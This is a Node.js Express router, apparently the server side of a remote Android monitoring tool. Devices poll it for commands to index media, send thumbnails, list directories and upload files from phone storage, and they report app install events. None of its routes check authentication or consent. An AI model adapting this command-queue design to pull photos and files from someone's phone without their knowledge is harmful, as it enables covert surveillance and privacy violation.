const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const { getIO } = require('../signaling');

const router = express.Router();

const DATA_DIR = path.join(__dirname, '..', '..', 'data');
const MEDIA_DIR = path.join(DATA_DIR, 'media');
const FILES_DIR = path.join(DATA_DIR, 'files');
for (const dir of [DATA_DIR, MEDIA_DIR, FILES_DIR]) {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
}

function loadMap(filename) {
  try {
    const p = path.join(DATA_DIR, filename);
    if (fs.existsSync(p)) return new Map(Object.entries(JSON.parse(fs.readFileSync(p, 'utf8'))));
  } catch (e) {
    console.error(`Failed to load ${filename}:`, e.message);
  }
  return new Map();
}

function saveMap(filename, map) {
  try {
    fs.writeFileSync(
      path.join(DATA_DIR, filename),
      JSON.stringify(Object.fromEntries(map), null, 2),
      'utf8'
    );
  } catch (e) {
    console.error(`Failed to save ${filename}:`, e.message);
  }
}

const media = loadMap('media.json');
const appEvents = loadMap('appevents.json');

const mediaCommands = new Map();
const mediaResults = new Map();
const fileTransfers = new Map();

const MAX_MEDIA_PER_DEVICE = 5000;
const MAX_EVENTS_PER_DEVICE = 500;
const MAX_RESULTS = 500;

function safeId(value) {
  return String(value || '').replace(/[^A-Za-z0-9_-]/g, '_');
}

function now() {
  return Date.now();
}

function thumbDir(deviceId) {
  const dir = path.join(MEDIA_DIR, safeId(deviceId), 'thumbs');
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
}

function thumbFile(deviceId, mediaId, size) {
  return path.join(thumbDir(deviceId), `${safeId(mediaId)}_${size || 150}.jpg`);
}

function decodeBase64(value) {
  const raw = String(value || '');
  const comma = raw.indexOf(',');
  return Buffer.from(comma >= 0 ? raw.slice(comma + 1) : raw, 'base64');
}

function saveThumb(deviceId, mediaId, base64, size) {
  if (!base64) return;
  try {
    const buffer = decodeBase64(base64);
    if (buffer.length > 0) fs.writeFileSync(thumbFile(deviceId, mediaId, size || 150), buffer);
  } catch (e) {
    console.error('thumb save failed:', e.message);
  }
}

function enqueue(deviceId, command) {
  const list = mediaCommands.get(deviceId) || [];
  list.push({ id: crypto.randomUUID(), createdAt: now(), ...command });
  if (list.length > 500) list.splice(0, list.length - 500);
  mediaCommands.set(deviceId, list);
}

function putResult(deviceId, result) {
  const key = `${deviceId}|${result.requestId}`;
  mediaResults.set(key, { ...result, deviceId, at: now() });
  if (mediaResults.size > MAX_RESULTS) {
    const oldest = [...mediaResults.entries()].sort((a, b) => a[1].at - b[1].at)[0];
    if (oldest) mediaResults.delete(oldest[0]);
  }
  const io = getIO();
  if (io) io.to(deviceId).emit('media-result', { deviceId, ...result });
}

function storageRelative(absPath) {
  const normalized = String(absPath || '').replace(/\\/g, '/');
  const marker = '/storage/emulated/0/';
  let rel = normalized;
  const idx = normalized.indexOf(marker);
  if (idx >= 0) rel = normalized.slice(idx + marker.length);
  else rel = normalized.replace(/^\/storage\/emulated\/0\/?/, '');
  rel = rel.replace(/^sdcard\//, '');
  return rel.split('/').filter(part => part && part !== '.' && part !== '..').join('/');
}

function fileDestination(deviceId, absPath) {
  const rel = storageRelative(absPath);
  if (!rel) return null;
  const base = path.join(FILES_DIR, safeId(deviceId));
  const dest = path.join(base, ...rel.split('/'));
  const resolvedBase = path.resolve(base);
  const resolvedDest = path.resolve(dest);
  if (resolvedDest !== resolvedBase && !resolvedDest.startsWith(resolvedBase + path.sep)) return null;
  return resolvedDest;
}

function pushMedia(deviceId, items, emitEvents) {
  if (!Array.isArray(items)) return { added: 0, total: 0 };
  const list = media.get(deviceId) || [];
  let added = 0;
  const changed = [];

  for (const item of items) {
    if (!item || item.mediaId === undefined || item.mediaId === null) continue;
    const id = String(item.mediaId);
    const entry = {
      mediaId: id,
      kind: item.kind || 'other',
      name: item.name || '',
      mime: item.mime || '',
      date: Number(item.date) || now(),
      size: Number(item.size) || 0,
      width: Number(item.width) || 0,
      height: Number(item.height) || 0,
      duration: Number(item.duration) || 0,
      bucket: item.bucket || '',
      path: item.path || '',
      indexedAt: now(),
    };
    const existing = list.find(x => String(x.mediaId) === id);
    if (existing) Object.assign(existing, entry);
    else {
      list.push(entry);
      added++;
    }
    if (item.thumb) saveThumb(deviceId, id, item.thumb, item.thumbSize || 150);
    changed.push({ ...entry, deviceId });
  }

  list.sort((a, b) => b.date - a.date);
  if (list.length > MAX_MEDIA_PER_DEVICE) list.splice(MAX_MEDIA_PER_DEVICE);
  media.set(deviceId, list);
  if (changed.length) saveMap('media.json', media);

  const io = getIO();
  if (io && emitEvents) {
    for (const entry of changed) io.to(deviceId).emit('media-added', entry);
  }
  return { added, total: list.length };
}

router.post('/media/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { items } = req.body || {};
  if (!Array.isArray(items)) return res.status(400).json({ error: 'items required' });
  res.json({ ok: true, ...pushMedia(deviceId, items, true) });
});

router.post('/media/index/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { items } = req.body || {};
  if (!Array.isArray(items)) return res.status(400).json({ error: 'items required' });
  res.json({ ok: true, ...pushMedia(deviceId, items, false) });
});

router.get('/media/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const kind = String(req.query.kind || 'all').toLowerCase();
  const limit = Math.min(Math.max(parseInt(req.query.limit, 10) || 200, 1), 500);
  const offset = Math.max(parseInt(req.query.offset, 10) || 0, 0);

  let list = media.get(deviceId) || [];
  const counts = { all: list.length, camera: 0, screenshot: 0, download: 0, other: 0 };
  for (const item of list) counts[item.kind] = (counts[item.kind] || 0) + 1;
  if (kind !== 'all') list = list.filter(item => item.kind === kind);

  const items = list.slice(offset, offset + limit).map(item => ({
    ...item,
    hasThumb: fs.existsSync(thumbFile(deviceId, item.mediaId, 150)),
    thumbUrl: `/api/media/thumb/${encodeURIComponent(deviceId)}/${encodeURIComponent(item.mediaId)}`,
  }));
  res.json({ items, total: list.length, counts });
});

router.get('/media/thumb/:deviceId/:mediaId', (req, res) => {
  const { deviceId, mediaId } = req.params;
  const size = parseInt(req.query.size, 10) || 150;
  let file = thumbFile(deviceId, mediaId, size);
  if (!fs.existsSync(file)) file = thumbFile(deviceId, mediaId, 150);
  if (fs.existsSync(file)) return res.sendFile(file);
  return res.status(404).json({ error: 'thumbnail not ready' });
});

router.post('/media/thumb/:deviceId/:mediaId', (req, res) => {
  const { deviceId, mediaId } = req.params;
  const { thumb, size } = req.body || {};
  if (!thumb) return res.status(400).json({ error: 'thumb required' });
  saveThumb(deviceId, mediaId, thumb, size || 150);
  res.json({ ok: true });
});

router.post('/media/index-request/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const requestId = crypto.randomUUID();
  enqueue(deviceId, {
    id: requestId,
    action: 'index',
    limit: Math.min(Math.max(parseInt(req.body && req.body.limit, 10) || 5000, 1), 5000),
  });
  res.json({ ok: true, requestId });
});

router.post('/media/thumb-request/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { mediaId, size } = req.body || {};
  if (!mediaId) return res.status(400).json({ error: 'mediaId required' });
  const requestId = crypto.randomUUID();
  enqueue(deviceId, { id: requestId, action: 'thumb', mediaId, size: size || 150 });
  res.json({ ok: true, requestId });
});

router.post('/media/thumb-batch-request/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const { mediaIds, size } = req.body || {};
  if (!Array.isArray(mediaIds) || mediaIds.length === 0) {
    return res.status(400).json({ error: 'mediaIds required' });
  }
  const ids = mediaIds.slice(0, 40).map(id => String(id));
  const requestId = crypto.randomUUID();
  enqueue(deviceId, { id: requestId, action: 'thumbBatch', mediaIds: ids, size: size || 150 });
  res.json({ ok: true, requestId, count: ids.length });
});

router.get('/media/command/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const list = mediaCommands.get(deviceId) || [];
  const command = list.shift();
  if (!list.length) mediaCommands.delete(deviceId);
  res.json(command ? { command, ...command } : {});
});

router.get('/media/result/:deviceId/:requestId', (req, res) => {
  const key = `${req.params.deviceId}|${req.params.requestId}`;
  const result = mediaResults.get(key);
  if (!result) return res.json({ pending: true });
  res.json(result);
});

router.post('/media/result/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const result = req.body || {};
  if (!result.requestId) return res.status(400).json({ error: 'requestId required' });
  putResult(deviceId, result);
  res.json({ ok: true });
});

router.post('/appevents/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const body = req.body || {};
  if (!body.packageName || !body.action) return res.status(400).json({ error: 'invalid event' });

  const list = appEvents.get(deviceId) || [];
  const eventId = body.eventId || `${body.packageName}|${body.action}|${body.timestamp || now()}`;
  if (list.some(item => item.eventId === eventId)) return res.json({ ok: true, dup: true });

  const event = {
    eventId,
    packageName: body.packageName,
    appName: body.appName || body.packageName,
    action: body.action,
    versionName: body.versionName || '',
    installer: body.installer || '',
    isSystem: !!body.isSystem,
    timestamp: Number(body.timestamp) || now(),
  };
  list.push(event);
  if (list.length > MAX_EVENTS_PER_DEVICE) list.splice(0, list.length - MAX_EVENTS_PER_DEVICE);
  appEvents.set(deviceId, list);
  saveMap('appevents.json', appEvents);

  const io = getIO();
  if (io) io.emit('app-event', { deviceId, ...event });
  console.log(`[AppEvent] ${deviceId} ${event.action}: ${event.appName} (${event.packageName})`);
  res.json({ ok: true, total: list.length });
});

router.get('/appevents/summary', (req, res) => {
  const devices = [];
  for (const [deviceId, list] of appEvents.entries()) {
    devices.push({ deviceId, total: list.length, last: list[list.length - 1] || null });
  }
  res.json({ devices });
});

router.get('/appevents/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const limit = Math.min(Math.max(parseInt(req.query.limit, 10) || 200, 1), 500);
  const since = parseInt(req.query.since, 10) || 0;
  const list = [...(appEvents.get(deviceId) || [])].reverse();
  const filtered = since ? list.filter(item => item.timestamp > since) : list;
  res.json({ events: filtered.slice(0, limit), total: list.length });
});

router.post('/files/list/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const target = req.body && req.body.path;
  if (!target) return res.status(400).json({ error: 'path required' });
  const requestId = crypto.randomUUID();
  enqueue(deviceId, { id: requestId, action: 'listDir', path: target });
  res.json({ ok: true, requestId });
});

router.post('/files/download/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const target = req.body && req.body.path;
  if (!target) return res.status(400).json({ error: 'path required' });
  const requestId = crypto.randomUUID();
  enqueue(deviceId, { id: requestId, action: 'download', path: target });
  res.json({ ok: true, requestId });
});

router.post(
  '/files/chunk/:deviceId',
  express.raw({ type: 'application/octet-stream', limit: '8mb' }),
  (req, res) => {
    const { deviceId } = req.params;
    const absPath = req.query.path;
    const offset = parseInt(req.query.offset, 10) || 0;
    const total = parseInt(req.query.total, 10) || 0;
    const dest = fileDestination(deviceId, absPath);
    if (!dest) return res.status(400).json({ error: 'invalid path' });
    if (!Buffer.isBuffer(req.body) || !req.body.length) return res.status(400).json({ error: 'empty chunk' });

    fs.mkdirSync(path.dirname(dest), { recursive: true });
    if (offset === 0) fs.writeFileSync(dest, req.body);
    else fs.appendFileSync(dest, req.body);

    const key = `${deviceId}|${storageRelative(absPath)}`;
    const transfer = { received: offset + req.body.length, total: total || offset + req.body.length };
    fileTransfers.set(key, transfer);
    res.json({ ok: true, ...transfer });
  }
);

router.get('/files/status/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const dest = fileDestination(deviceId, req.query.path);
  if (!dest) return res.status(400).json({ error: 'invalid path' });
  const key = `${deviceId}|${storageRelative(req.query.path)}`;
  const transfer = fileTransfers.get(key) || {};
  const exists = fs.existsSync(dest);
  res.json({ exists, size: exists ? fs.statSync(dest).size : 0, received: transfer.received || 0, total: transfer.total || 0 });
});

router.get('/files/content/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const dest = fileDestination(deviceId, req.query.path);
  if (!dest || !fs.existsSync(dest) || !fs.statSync(dest).isFile()) {
    return res.status(404).json({ error: 'file not found' });
  }
  res.download(dest, path.basename(dest));
});

router.get('/files/root', (req, res) => {
  res.json({ root: '/storage/emulated/0' });
});

module.exports = router;
